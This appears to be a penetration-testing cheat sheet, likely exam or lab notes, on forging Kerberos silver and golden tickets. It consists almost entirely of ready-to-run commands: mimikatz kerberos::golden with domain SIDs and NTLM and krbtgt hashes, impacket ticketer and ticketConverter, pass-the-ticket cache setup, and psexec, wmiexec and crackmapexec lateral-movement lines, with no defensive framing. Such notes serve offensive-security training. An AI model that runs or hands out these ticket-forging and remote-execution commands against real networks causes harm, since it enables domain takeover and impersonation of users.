### Generatre Silver Ticket

*To create a silver ticket, we use the password hash and not the cleartext password. If a kerberoast session presented us with the cleartext password, we must hash it before using it to generate a silver ticket.*

*Creating the golden ticket and injecting it into memory does not require any administrative privileges*

#### Using Mimikatz
***Create & inject a ticket in memory :***

```powershell 

C:\>whoami /user

USER INFORMATION
----------------

User Name   SID
=========== ==============================================
corp\offsec S-1-5-21-1602875587-2787523311-2599479668-1103

```

AD SID : <font style="color:red">S-1-5-21-1602875587-2787523311-2599479668</font>

```powershell
kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
```



#### Using Ticketer

```bash
/opt/impacket/examples/ticketer.py -nthash d098fa8675acd7d26ab86eb2581233e5 -domain-sid S-1-5-21-88558181-3850747640-3669402957 -domain EXAM.COM -spn ZENSVC/DC02.exam.com random_user
```

### Using TicketConverter
```bash
python /opt/impacket/examples/ticketConverter.py '[0;99989]-2-0-40e10000-zensvc@krbtgt-EXAM.COM.kirbi' zensvc.ccache
```

### PTT

```bash
export KRB5CCNAME='/path/to/random_user.ccache'
```

```bash
/opt/impacket/examples/psexec.py -dc-ip 192.168.237.170 -target-ip 192.168.237.170 EXAM.COM/aoukUser@xor.com -k -no-pass
```

```shell
psexec.py -k 'DOMAIN/USER@TARGET'
smbexec.py -k 'DOMAIN/USER@TARGET'
wmiexec.py -k 'DOMAIN/USER@TARGET'
atexec.py -k 'DOMAIN/USER@TARGET'
dcomexec.py -k 'DOMAIN/USER@TARGET'
crackmapexec winrm $TARGETS -k -x whoami
crackmapexec smb $TARGETS -k -x whoami

```

### Generatre Golden Ticket

#### Using Mimikatz

```powershell
kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
```